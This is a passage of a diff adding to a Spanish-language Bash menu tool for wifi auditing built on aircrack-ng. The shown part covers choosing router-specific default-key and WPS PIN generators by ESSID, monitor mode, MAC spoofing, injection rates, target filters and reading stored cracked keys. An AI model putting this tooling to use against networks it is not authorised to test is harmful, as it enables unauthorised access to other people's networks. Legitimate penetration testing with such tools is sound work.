+	[[ "$KEYGEN" = *wpamagickey* ]] && [ "${BSSID:0:8}" = "38:72:C0" ] && [ "${ESSID:0:8}" = "JAZZTEL_" ] && KEYGEN="$(echo "$KEYGEN"|grep -v "wpamagickey")"
+	[[ "$KEYGEN" = *jazzteldecrypter* ]] && [ ! "$(echo "$ESSID"|egrep -x "JAZZTEL_[[:xdigit:]]{2}")" ] && KEYGEN="$(echo "$KEYGEN"|grep -v "jazzteldecrypter")"
+	[[ "$KEYGEN" = *wlandecrypter* ]] && [ ! "$(echo "$ESSID"|egrep -x "WLAN_[[:xdigit:]]{2}")" ] && KEYGEN="$(echo "$KEYGEN"|grep -v "wlandecrypter")"
+	[[ "$KEYGEN" = *stkeys* ]] && [ "$(echo "$KEYGEN"|grep "stkeys ¿?$")" ] && KEYGEN="$(echo "$KEYGEN"|grep -v "stkeys")"
+	[[ "$KEYGEN" = *FTE_Keygen* ]] && [ ! "$(echo "$ESSID"|egrep -x "FTE-[[:xdigit:]]{4}")" ] && KEYGEN="$(echo "$KEYGEN"|grep -v "FTE_Keygen")"
+	[[ "$KEYGEN" = *belkin4xx.py* ]] && [ ! "$(echo "$ESSID"|egrep -x "Belkin_[[:xdigit:]]{6}|Belkin.[[:xdigit:]]{4}|belkin.[[:xdigit:]]{4}|belkin.[[:xdigit:]]{3}")" ] && KEYGEN="$(echo "$KEYGEN"|grep -v "belkin4xx.py")"
+	#[[ "$KEYGEN" = *PixieWPS* ]] && KEYGEN="$(echo "$KEYGEN"|sed 's/PixieWPS ¿?/PixieWPS OK/g')"
+	
+	if [ "$1" = "WEP" ]; then
+		
+		if [ "$(echo "$ESSID"|egrep -x "JAZZTEL_[[:xdigit:]]{2}")" ]; then
+			
+			[[ "$KEYGEN" != *jazzteldecrypter* ]] && KEYGEN="$(echo -e "$KEYGEN\njazzteldecrypter ¿?")"
+			
+		elif [ "$(echo "$ESSID"|egrep -x "WLAN_[[:xdigit:]]{2}")" ]; then
+			
+			[[ "$KEYGEN" != *wlandecrypter* ]] && KEYGEN="$(echo -e "$KEYGEN\nwlandecrypter ¿?")"
+		fi
+		
+	elif [ "$1" = "WPS" ]; then
+		
+		if [ "$(echo "$ESSID"|egrep -x "MOVISTAR_[[:xdigit:]]{4}")" ]; then
+			
+			[[ "$KEYGEN" != *PINGENERICO* ]] && KEYGEN="$(echo -e "$KEYGEN\nPINGENERICO ¿?")" && \
+			PINGENERICO="$(echo "$MACs_DB"|grep "PINGENERICO"|grep "MOVISTAR_????"|rev|awk -F'\t' '{print $1}'|rev|tr ' ' '\n'|sort -u|tr '\n' ' ') $PINGENERICO"
+			
+		elif [ "$(echo "$ESSID"|egrep -i "^PTV_|^PTV-")" ]; then
+			
+			[[ "$KEYGEN" != *PTV_Keygen* ]] && KEYGEN="$(echo -e "$KEYGEN\nPTV_Keygen ¿?")"
+			
+		elif [ "$(echo "$ESSID"|egrep -i "^Dlink")" ]; then
+			
+			[[ "$KEYGEN" != *dlink_pingen.py* ]] && KEYGEN="$(echo -e "$KEYGEN\ndlink_pingen.py ¿?")"
+			
+		elif [ "$(echo "$ESSID"|egrep -i "^Belkin")" ]; then
+			
+			[[ "$KEYGEN" != *belkin_pingen* ]] && KEYGEN="$(echo -e "$KEYGEN\nbelkin_pingen ¿?")"
+		fi
+	fi
+	
+	[ ! "$KEYGEN" ] && return
+	[ "$(echo "$KEYGEN"|grep "OK$")" ] && SOPORTADA="SI"||SOPORTADA="¿?"
+	KEYGEN="$(echo "$KEYGEN"|tr '\n' '|')"
+	
+	if [ "$1" = "WEP" -o "$1" = "WPA" ]; then
+		
+		KEYGEN_WEPWPA[$N]="$KEYGEN"
+		SOPORTADA_WEPWPA[$N]="$SOPORTADA"
+		
+	elif [ "$1" = "WPS" ]; then
+		
+		KEYGEN_WPS[$N]="$KEYGEN"
+		PIN_GENERICO[$N]="$PINGENERICO"
+		SOPORTADA_WPS[$N]="$SOPORTADA"
+	fi
+}
+##########################################################################
+##########################################################################
+
+##########################################################################
+##########################################################################
+## OPERACIONES CON INTERFACE WIFI
+
+ResetInterface() {
+	
+	ResetInterfaceError() {
+		
+		echo "[0;31mERROR:[0m $1"
+		sleep 3
+		Salir
+	}
+	
+	echo
+	echo -n " - Reseteando interfaz $IFACE...[0m "
+	
+	ifconfig "$IFACE" down >/dev/null
+	
+	if [ -d "/sys/class/net/$IFACE/device/driver" ]; then
+		
+		IFACEX="$IFACE"
+		
+	elif  [ -d "/sys/class/net/${IFACE}mon/device/driver" ]; then
+		
+		IFACEX="${IFACE}mon"
+	else
+		ResetInterfaceError "No existe la interfaz $IFACE"
+	fi
+	
+	ID="$(basename "$(ls -l "/sys/class/net/$IFACEX/device")")"
+	OLD_DIR="$(pwd)"
+	cd "/sys/class/net/$IFACEX/device/driver/"
+	echo -n "$ID" >unbind||ResetInterfaceError "Ocurrió un problema al desmontar la interfaz $IFACE"
+	sleep 1
+	echo -n "$ID" >bind||ResetInterfaceError "Ocurrió un problema al montar la interfaz $IFACE"
+	sleep 2
+	[ "$(which nmcli)" ] && nmcli device set "$IFACE" managed no 2>/dev/null
+	cd "$OLD_DIR"
+	
+	if [ "$NUEVA_MAC" ]; then
+		
+		macchanger -m "$NUEVA_MAC" "$IFACE" >/dev/null 2>&1
+	fi
+	
+	ifconfig "$IFACE" up >/dev/null && echo "[0;32m√ [0m"||ResetInterfaceError "Error al levantar la interfaz $IFACE"
+}
+
+CheckInterface() {
+	
+	if [ "$(ip route|grep "$IFACE")" ]; then
+		
+		Clear
+		Cabecera
+		sleep 0.5
+		
+		echo
+		echo "[0;31m - La interfaz $IFACE está asociada a un punto de acceso, no se puede continuar[0m"
+		echo
+		
+		unset IFACE
+		sleep 3
+		MenuPrincipal
+	fi
+}
+
+ErrorIface() {
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	
+	echo
+	echo "[0;31m - No se ha encontrado ninguna tarjeta wifi en este equipo, no se puede continuar[0m"
+	echo
+	
+	sleep 3
+	MenuPrincipal
+}
+
+SeleccionarInterfaceAuto() {
+	
+	if [ ! "$IFACE" ]; then
+		
+		IFACES="$(iwconfig 2>/dev/null|egrep -v "^mon[0-9]|Mode:Master|^ |^$"|awk '{print $1}')"
+		
+		if [ ! "$IFACES" ]; then
+			
+			ErrorIface
+			exit 1
+		fi
+		
+		if [ $(echo "$IFACES"|wc -l) -eq 1 ]; then
+			
+			IFACE="${IFACES%mon}"
+			CheckInterface
+			[ "$(which nmcli)" ] && nmcli device set "$IFACE" managed no 2>/dev/null
+			DRIVER_WIFI="$(basename "$(ls -l "/sys/class/net/$IFACE/device/driver")")"
+			[ ! "$DRIVER_WIFI" -a -d "/sys/class/net/tiwlan0/wireless" ] && DRIVER_WIFI="WiLink"
+			FABRICANTE_WIFI="$(macchanger -s $IFACE|grep "^Current"|cut -d'(' -f2|sed 's/)$//')"
+			DRIVER_WIFI="$DRIVER_WIFI"
+		else
+			SeleccionarInterface
+			Clear
+			Cabecera
+			sleep 0.5
+		fi
+	else
+		CheckInterface
+	fi
+}
+
+SeleccionarInterface() {
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	
+	IFACES="$(iwconfig 2>/dev/null|egrep -v "^mon[0-9]|Mode:Master|^ |^$"|awk '{print $1}')"
+	
+	if [ ! "$IFACES" ]; then
+		
+		ErrorIface
+	fi
+	
+	N=0
+	for WLANX in $IFACES; do
+		
+		N=$(($N+1))
+		DRIVER_WIFI="$(basename "$(ls -l "/sys/class/net/$WLANX/device/driver")")"
+		[ ! "$DRIVER_WIFI" -a -d "/sys/class/net/tiwlan0/wireless" ] && DRIVER_WIFI="WiLink"
+		while [ ${#DRIVER_WIFI} -le 7 ]; do DRIVER_WIFI="$DRIVER_WIFI "; done
+		FABRICANTE_WIFI[$N]="$(macchanger -s $WLANX|grep "^Current"|cut -d'(' -f2|sed 's/)$//')"
+		DRIVER_WIFI[$N]="$DRIVER_WIFI"
+		WLAN[$N]="$WLANX"
+	done
+	
+	SELECT=1
+	GUARDAR=0
+	while [ $GUARDAR -eq 0 ]; do
+		
+		unset RESALTAR
+		RESALTAR[$SELECT]="[48;5;21m"
+		Clear
+		Cabecera
+		
+		echo
+		echo  " [0;32mSeleccionar interfaz[0m"
+		echo
+		echo -e "   INTERFACE\tDRIVER\t\tFABRICANTE"
+		echo "   ------------------------------------------"
+		
+		for ((X=1;$X<=$N;X++)); do
+			
+			echo -e " ${RESALTAR[$X]}▶ ${WLAN[$X]%mon}\t${DRIVER_WIFI[$X]}\t${FABRICANTE_WIFI[$X]}[0m"
+		done
+		
+		echo
+		echo " ${RESALTAR[$(($N+1))]}◀ Volver al menú principal[0m"
+		
+		while read -sn1 TECLA; do
+			
+			LeerTecla
+			
+			case "$TECLA" in
+				
+				$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+				$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt $(($N+1)) ] && SELECT=$(($SELECT+1)); break;;
+				$'\e[D'|a|A) GUARDAR=1; MenuPrincipal; break;; 
+			     ''|$'\e[C'|d|D) GUARDAR=1; [ "$(which nmcli)" ] && nmcli device set "$IFACE" managed yes 2>/dev/null; IFACE="${WLAN[$SELECT]%mon}"; FABRICANTE_WIFI="${FABRICANTE_WIFI[$SELECT]}";DRIVER_WIFI="${DRIVER_WIFI[$SELECT]}"; break;; 
+			esac
+		done
+	done
+	
+	[ "$N" ] && [ "$SELECT" = "$(($N+1))" ] && MenuPrincipal
+	CheckInterface
+	[ "$(which nmcli)" ] && nmcli device set "$IFACE" managed no 2>/dev/null
+	[  "$(iwconfig 2>/dev/null|grep "^$IFACE_MON "|grep "Mode:Monitor")" ] && $AIRMON_NG stop "$IFACE_MON" >/dev/null 2>&1 &
+}
+
+MontarMonitor() {
+	
+	ResetInterface
+	
+	echo
+	echo -n " - Montando $IFACE en modo monitor... "
+	
+	IFACE_MON="$($AIRMON_NG start $IFACE|grep "enabled on"|cut -d' ' -f5|sed 's/)//')"
+	[ ! "$IFACE_MON" ] && IFACE_MON="${IFACE}mon"
+	
+	if [ "$(iwconfig 2>/dev/null|grep "^$IFACE_MON "|grep "Mode:Monitor")" ]; then
+		
+		echo "[0;32m√ [0m"
+	else
+		echo "[0;31mERROR[0m" && sleep 3 && MenuPrincipal
+	fi
+	
+	if [ "$NUEVA_MAC" ]; then
+		
+		ifconfig "$IFACE_MON" down
+		macchanger -m "$NUEVA_MAC" "$IFACE_MON" >/dev/null 2>&1
+		ifconfig "$IFACE_MON" up
+	fi
+}
+##########################################################################
+##########################################################################
+
+
+##########################################################################
+##########################################################################
+## CONFIGURAR PARAMETROS
+
+ConfigurarCanalEscanear() {
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	
+	echo
+	echo " [0;32mCanál a escanear[0m - [Enter] Para guardar"
+	echo
+	echo " [Todos] 1 2 3 4 5 6 7 8 9 10 11 12 13 14"
+	
+	X[0]=" ---|------------------------------------"
+	X[1]=" --------|-------------------------------"
+	X[2]=" ----------|-----------------------------"
+	X[3]=" ------------|---------------------------"
+	X[4]=" --------------|-------------------------"
+	X[5]=" ----------------|-----------------------"
+	X[6]=" ------------------|---------------------"
+	X[7]=" --------------------|-------------------"
+	X[8]=" ----------------------|-----------------"
+	X[9]=" ------------------------|---------------"
+	X[10]=" --------------------------|-------------"
+	X[11]=" -----------------------------|----------"
+	X[12]=" --------------------------------|-------"
+	X[13]=" -----------------------------------|----"
+	X[14]=" --------------------------------------|-"
+	
+	echo "${X[$SCAN_CHANNEL]}"
+	
+	while read -sn1 TECLA; do
+		
+		LeerTecla
+		
+		case "$TECLA" in
+			
+			$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SCAN_CHANNEL -gt 0 ] && SCAN_CHANNEL=$(($SCAN_CHANNEL-1));;
+			$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SCAN_CHANNEL -lt 14 ] && SCAN_CHANNEL=$(($SCAN_CHANNEL+1));;
+			$'\e[D'|a|A) [ $SCAN_CHANNEL -gt 0 ] && SCAN_CHANNEL=$(($SCAN_CHANNEL-1));;
+			$'\e[C'|d|D) [ $SCAN_CHANNEL -lt 14 ] && SCAN_CHANNEL=$(($SCAN_CHANNEL+1));;
+			     '') break;;
+		esac
+		
+		echo "[1A${X[$SCAN_CHANNEL]}[K"
+	done
+	
+	MenuConfiguracion
+}
+
+ConfigurarPPSInjectar() {
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	
+	echo
+	echo " [0;32mPaquetes por segundo a injectar (PPS)[0m - [Enter] Para guardar"
+	echo
+	echo " 100 200 300 400 500 600 700 800 900 1000"
+	
+	X[100]=" -|--------------------------------------"
+	X[200]=" -----|----------------------------------"
+	X[300]=" ---------|------------------------------"
+	X[400]=" -------------|--------------------------"
+	X[500]=" -----------------|----------------------"
+	X[600]=" ---------------------|------------------"
+	X[700]=" -------------------------|--------------"
+	X[800]=" -----------------------------|----------"
+	X[900]=" ---------------------------------|------"
+	X[1000]=" --------------------------------------|-"
+	
+	echo "${X[$PPS]}"
+	
+	while read -sn1 TECLA; do
+		
+		LeerTecla
+		
+		case "$TECLA" in
+			
+			$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $PPS -gt 100 ] && PPS=$(($PPS-100));;
+			$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $PPS -lt 1000 ] && PPS=$(($PPS+100));;
+			$'\e[D'|a|A) [ $PPS -gt 100 ] && PPS=$(($PPS-100));;
+			$'\e[C'|d|D) [ $PPS -lt 1000 ] && PPS=$(($PPS+100));;
+			     '') break;;
+		esac
+		
+		echo "[1A${X[$PPS]}[K"
+	done
+	
+	MenuConfiguracion
+}
+
+ConfigurarTiempoEscanear() {
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	
+	echo
+	echo " [0;32mTiempo a escanear (en segundos)[0m - [Enter] Para guardar"
+	echo
+	echo  " 10 20 30 40 50 60 70 80 90 100 110 120"
+	
+	X[10]=" -|------------------------------------"
+	X[20]=" ----|---------------------------------"
+	X[30]=" -------|------------------------------"
+	X[40]=" ----------|---------------------------"
+	X[50]=" -------------|------------------------"
+	X[60]=" ----------------|---------------------"
+	X[70]=" -------------------|------------------"
+	X[80]=" ----------------------|---------------"
+	X[90]=" -------------------------|------------"
+	X[100]=" ----------------------------|---------"
+	X[110]=" --------------------------------|-----"
+	X[120]=" ------------------------------------|-"
+	
+	echo "${X[$SCAN_TIME]}"
+	
+	while read -sn1 TECLA; do
+		
+		LeerTecla
+		
+		case "$TECLA" in
+			
+			$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SCAN_TIME -gt 10 ] && SCAN_TIME=$(($SCAN_TIME-10));;
+			$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SCAN_TIME -lt 120 ] && SCAN_TIME=$(($SCAN_TIME+10));;
+			$'\e[D'|a|A) [ $SCAN_TIME -gt 10 ] && SCAN_TIME=$(($SCAN_TIME-10));;
+			$'\e[C'|d|D) [ $SCAN_TIME -lt 120 ] && SCAN_TIME=$(($SCAN_TIME+10));;
+			     '') break;;
+		esac
+		
+		echo "[1A${X[$SCAN_TIME]}[K"
+	done
+	
+	MenuConfiguracion
+}
+
+ConfigurarListaObjetivos() {
+	
+	MostrarFabricante() {
+		
+		Clear
+		Cabecera
+		sleep 0.5
+		[ "$FABRICANTES" = "SI" ] && SELECT=1
+		[ "$FABRICANTES" = "NO" ] && SELECT=2
+		
+		GUARDAR=0
+		while [ $GUARDAR -eq 0 ]; do
+			
+			unset RESALTAR
+			RESALTAR[$SELECT]="[48;5;21m"
+			Clear
+			Cabecera
+			
+			echo
+			echo " [0;32mConfigurar información sobre el fabricante[0m - [Enter] Para guardar"
+			echo
+			echo " ${RESALTAR[1]} - Mostrar fabricante del router[0m"
+			echo
+			echo " ${RESALTAR[2]} - Ocultar fabricante del router[0m"
+			
+			while read -sn1 TECLA; do
+				
+				LeerTecla
+				
+				case "$TECLA" in
+					
+					$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+					$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt 2 ] && SELECT=$(($SELECT+1)); break;;
+					     '')
+						
+						case $SELECT in
+							
+							1) GUARDAR=1; FABRICANTES="SI"; break;;
+							2) GUARDAR=1; FABRICANTES="NO"; break;;
+						esac
+					;; 
+				esac
+			done
+		done
+		
+		ConfigurarListaObjetivos
+	}
+	
+	FiltrarWEPWPAWPS() {
+		
+		Clear
+		Cabecera
+		sleep 0.5
+		
+		case $FILTRO in
+			
+			NO ) SELECT=1 ;;
+			WEP ) SELECT=2 ;;
+			WPA ) SELECT=3 ;;
+			WPS ) SELECT=4 ;;
+		esac
+		
+		GUARDAR=0
+		while [ $GUARDAR -eq 0 ]; do
+			
+			unset RESALTAR
+			RESALTAR[$SELECT]="[48;5;21m"
+			Clear
+			Cabecera
+			
+			echo
+			echo " [0;32mConfigurar filtro[0m - [Enter] Para guardar"
+			echo
+			echo " ${RESALTAR[1]} - No filtrar[0m"
+			echo
+			echo " ${RESALTAR[2]} - Filtro WEP[0m"
+			echo
+			echo " ${RESALTAR[3]} - Filtro WPA[0m"
+			echo
+			echo " ${RESALTAR[4]} - Filtro WPS[0m"
+			
+			while read -sn1 TECLA; do
+				
+				LeerTecla
+				
+				case "$TECLA" in
+					
+					$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+					$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt 4 ] && SELECT=$(($SELECT+1)); break;;
+					     '')
+						
+						case $SELECT in
+							
+							1) GUARDAR=1; FILTRO="NO"; break;;
+							2) GUARDAR=1; FILTRO="WEP"; break;;
+							3) GUARDAR=1; FILTRO="WPA"; break;;
+							4) GUARDAR=1; FILTRO="WPS"; break;;
+						esac
+					;; 
+				esac
+			done
+		done
+		
+		ConfigurarListaObjetivos
+	}
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	
+	SELECT=1
+	GUARDAR=0
+	while [ $GUARDAR -eq 0 ]; do
+		
+		Clear
+		Cabecera
+		unset RESALTAR
+		RESALTAR[$SELECT]="[48;5;21m"
+		
+		echo
+		echo " [0;32mConfigurar lista de objetivos[0m"
+		echo
+		echo " ${RESALTAR[1]}▶ Filtrar por WEP|WPA|WPS[0m"
+		echo " ${RESALTAR[2]}▶ Mostrar/ocultar fabricante del router[0m"
+		echo
+		echo " ${RESALTAR[3]}◀ Volver[0m"
+		
+		while read -sn1 TECLA; do
+			
+			LeerTecla
+			
+			case "$TECLA" in
+				
+				$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+				$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt 3 ] && SELECT=$(($SELECT+1)); break;;
+				$'\e[D'|a|A) GUARDAR=1; break;;
+			     ''|$'\e[C'|d|D)
+					case $SELECT in
+						
+						1) FiltrarWEPWPAWPS; break;;
+						2) MostrarFabricante; break;;
+						3) GUARDAR=1; break;;
+					esac
+				;;
+			esac
+		done
+	done
+}
+
+ConfigurarModoMonitor() {
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	[ "$AIRMON_NG" = "airmon-ng" ] && SELECT=1
+	[ "$AIRMON_NG" = "airmon-zc" ] && SELECT=2
+	
+	GUARDAR=0
+	while [ $GUARDAR -eq 0 ]; do
+		
+		unset RESALTAR
+		RESALTAR[$SELECT]="[48;5;21m"
+		Clear
+		Cabecera
+		
+		echo
+		echo " [0;32mConfigurar modo monitor[0m - [Enter] Para guardar"
+		echo
+		echo " ${RESALTAR[1]} - Utilizar airmon-ng[0m (Recomendado)"
+		echo
+		echo " ${RESALTAR[2]} - Utilizar airmon-zc[0m (Experimental)"
+		
+		while read -sn1 TECLA; do
+			
+			LeerTecla
+			
+			case "$TECLA" in
+				
+				$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+				$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt 2 ] && SELECT=$(($SELECT+1)); break;;
+				     '')
+					
+					case $SELECT in
+						
+						1) GUARDAR=1; [  "$(iwconfig 2>/dev/null|grep "^$IFACE_MON "|grep "Mode:Monitor")" ] && $AIRMON_NG stop "$IFACE_MON" >/dev/null 2>&1; AIRMON_NG="airmon-ng"; break;;
+						2) GUARDAR=1; [  "$(iwconfig 2>/dev/null|grep "^$IFACE_MON "|grep "Mode:Monitor")" ] && $AIRMON_NG stop "$IFACE_MON" >/dev/null 2>&1; AIRMON_NG="airmon-zc"; break;;
+					esac
+				;; 
+			esac
+		done
+	done
+	
+	MenuConfiguracion
+}
+
+ConfigurarEscaneoObjetivos() {
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	[ "$ESCANER" = "airodump-ng" ] && SELECT=1
+	[ "$ESCANER" = "DixieScan" ] && SELECT=2
+	
+	GUARDAR=0
+	while [ $GUARDAR -eq 0 ]; do
+		
+		unset RESALTAR
+		RESALTAR[$SELECT]="[48;5;21m"
+		Clear
+		Cabecera
+		
+		echo
+		echo " [0;32mConfigurar modo monitor[0m - [Enter] Para guardar"
+		echo
+		echo " ${RESALTAR[1]} - Utilizar airodump-ng[0m (Recomendado)"
+		echo
+		echo " ${RESALTAR[2]} - Utilizar DixieScan[0m (Experimental)"
+		
+		while read -sn1 TECLA; do
+			
+			LeerTecla
+			
+			case "$TECLA" in
+				
+				$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+				$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt 2 ] && SELECT=$(($SELECT+1)); break;;
+				     '')
+					
+					case $SELECT in
+						
+						1) GUARDAR=1; ESCANER="airodump-ng"; break;;
+						2) GUARDAR=1; ESCANER="DixieScan"; break;;
+					esac
+				;; 
+			esac
+		done
+	done
+	
+	MenuConfiguracion
+}
+
+MenuConfiguracion() {
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	
+	SELECT=1
+	GUARDAR=0
+	while [ $GUARDAR -eq 0 ]; do
+		
+		Clear
+		Cabecera
+		unset RESALTAR
+		RESALTAR[$SELECT]="[48;5;21m"
+		
+		echo
+		echo " [0;32mConfigurar parámetros[0m"
+		echo
+		echo " ${RESALTAR[1]}▶ Configurar tiempo a escanear[0m"
+		echo " ${RESALTAR[2]}▶ Configurar canal a escanear[0m"
+		echo " ${RESALTAR[3]}▶ Configurar PPS a injectar[0m"
+		echo " ${RESALTAR[4]}▶ Configurar lista de objetivos[0m"
+		echo " ${RESALTAR[5]}▶ Configurar modo monitor[0m"
+		echo " ${RESALTAR[6]}▶ Configurar escaneo de objetivos[0m"
+		echo " ${RESALTAR[7]}▶ Restaurar valores originales[0m"
+		echo
+		echo " ${RESALTAR[8]}◀ Volver al menú principal[0m"
+		
+		while read -sn1 TECLA; do
+			
+			LeerTecla
+			
+			case "$TECLA" in
+				
+				$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+				$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt 8 ] && SELECT=$(($SELECT+1)); break;;
+				$'\e[D'|a|A) GUARDAR=1; break;;
+			     ''|$'\e[C'|d|D)
+					case $SELECT in
+						
+						1) ConfigurarTiempoEscanear; break;;
+						2) ConfigurarCanalEscanear; break;;
+						3) ConfigurarPPSInjectar; break;;
+						4) ConfigurarListaObjetivos; MenuConfiguracion; break;;
+						5) ConfigurarModoMonitor; break;;
+						6) ConfigurarEscaneoObjetivos; break;;
+						7) rm -f "$RAIZ/config.sh"; bash "$0"; exit;;
+						8) GUARDAR=1; break;;
+					esac
+				;;
+			esac
+		done
+	done
+	
+	GuardarConfiguracion
+	MenuPrincipal
+}
+
+GuardarConfiguracion() {
+	
+	(
+		echo "# Tiempo a escanear (en segundos)"
+		echo "SCAN_TIME=$SCAN_TIME"
+		echo "# Canál a escanear (0 = todos)"
+		echo "SCAN_CHANNEL=$SCAN_CHANNEL"
+		echo "# Paquetes por segundo a injectar"
+		echo "PPS=$PPS"
+		echo "# Configurar lista de objetivos"
+		echo "FABRICANTES=$FABRICANTES"
+		echo "FILTRO=$FILTRO"
+		echo "# Configurar modo monitor"
+		echo "AIRMON_NG=$AIRMON_NG"
+		echo "ESCANER=$ESCANER"
+		
+	) >"$RAIZ/config.sh"
+}
+##########################################################################
+##########################################################################
+
+
+##########################################################################
+##########################################################################
+## UTILIDADES
+
+CambiarMAC() {
+	
+	IntrocudirMAC() {
+		
+		Clear
+		Cabecera
+		sleep 0.5
+		
+		echo
+		echo " [0;32mCambiar dirección MAC[0m [MAC actual = $IFACE_MAC]"
+		echo
+		
+		read -p " - Introduce la nueva MAC: " NUEVA_MAC
+		sleep 1
+		
+		if [ ! "$(echo "$NUEVA_MAC"|egrep -x "([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}")" ] || [ $(($(echo "ibase=16; ${NUEVA_MAC:0:2}"|bc)%2)) -ne 0 ]; then
+			
+			echo
+			echo "[0;31m - Formato incorrecto, introduce la MAC en este formato: 00:11:22:33:44:55[0m"
+			echo
+			echo " - Presiona cualquier tecla para continuar"
+			echo
+			
+			while read -sn1 TECLA; do
+				
+				LeerTecla
+				break
+			done
+			
+			IntrocudirMAC
+		fi
+	}
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	
+	if [ ! "$IFACE" ]; then
+		
+		echo
+		echo  "[0;31m - No se ha seleccionado ninguna interfaz, no se puede continuar[0m"
+		echo
+		
+		sleep 3
+		MenuPrincipal
+	fi
+	
+	if [ "$(iwconfig 2>/dev/null|grep "^$IFACE_MON "|grep "Mode:Monitor")" ]; then
+		
+		ResetInterface
+		CambiarMAC
+	fi
+	
+	if [ -f "/sys/class/net/$IFACE/address" ]; then
+		
+		IFACE_MAC="$(cat "/sys/class/net/$IFACE/address"|tr '[:lower:]' '[:upper:]')"
+		
+	elif [ -f "/sys/class/net/${IFACE}mon/address" ]; then
+		
+		IFACE_MAC="$(cat "/sys/class/net/${IFACE}mon/address")"
+	fi
+	
+	SELECT=1
+	GUARDAR=0
+	while [ $GUARDAR -eq 0 ]; do
+		
+		Clear
+		Cabecera
+		unset RESALTAR
+		RESALTAR[$SELECT]="[48;5;21m"
+		
+		echo
+		echo " [0;32mCambiar dirección MAC[0m [MAC actual = $IFACE_MAC]"
+		echo
+		echo " ${RESALTAR[1]}▶ Introcudir MAC manualente[0m"
+		echo
+		echo " ${RESALTAR[2]}▶ Cambiar MAC automáticaente por una aleatoria[0m"
+		echo
+		echo " ${RESALTAR[3]}▶ Restaurar la MAC por defecto de la tarjeta wifi[0m"
+		echo
+		echo " ${RESALTAR[4]}◀ Volver al menú principal[0m"
+		
+		while read -sn1 TECLA; do
+			
+			LeerTecla
+			
+			case "$TECLA" in
+				
+				$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+				$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt 4 ] && SELECT=$(($SELECT+1)); break;;
+				$'\e[D'|a|A) GUARDAR=1; break;;
+			     ''|$'\e[C'|d|D)
+					case $SELECT in
+						
+						1) 
+							IntrocudirMAC
+							ifconfig "$IFACE" down
+							NUEVA_MAC="$(macchanger -m "$NUEVA_MAC" "$IFACE"|grep "^New MAC"|awk '{print $3}'|tr '[:lower:]' '[:upper:]')"
+							ifconfig "$IFACE" up
+							CambiarMAC
+							break;;
+						2)
+							ifconfig "$IFACE" down
+							NUEVA_MAC="$(macchanger -A "$IFACE")"
+							ifconfig "$IFACE" up
+							CambiarMAC
+							break;;
+						3)
+							unset NUEVA_MAC
+							ifconfig "$IFACE" down
+							macchanger -p "$IFACE" >/dev/null 2>&1
+							ifconfig "$IFACE" up
+							CambiarMAC
+							break;;
+						4)
+							GUARDAR=1
+							break;;
+					esac
+				;;
+			esac
+		done
+	done
+	
+	MenuPrincipal
+}
+
+DescubrirIP() {
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	
+	if [ ! "$BSSID" ]; then
+		
+		echo
+		echo  "[0;31m - No se ha seleccionado ningún objetivo, no se puede continuar[0m"
+		
+		sleep 3
+		MenuPrincipal
+	fi
+	
+	SeleccionarInterfaceAuto
+	
+	if [ ! "$(iwconfig 2>/dev/null|grep "^$IFACE_MON "|grep "Mode:Monitor")" ]; then
+		
+		MontarMonitor
+		sleep 3
+	fi
+	
+	if [ "$CIFRADO" != "OPN" ]; then
+		
+		if [ -f "$CLAVES/${ESSID////#}_${BSSID//:/-}.txt" ]; then
+			
+			CLAVE="$(cat "$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"|tr -d '\r'|sed 's/ $//g'|egrep "^CLAVE HEX|^CLAVE WEP|^CLAVE WPA"|tail -1|cut -d' ' -f3-)"
+		else
+			Clear
+			Cabecera
+			sleep 0.5
+			echo
+			read -p " - Introduce la clave ${CIFRADO:0:3}: " CLAVE
+			sleep 1
+		fi
+		
+		echo "$CLAVE" >"$TMP/CHECK_CLAVE.txt"
+	fi
+	
+	Clear
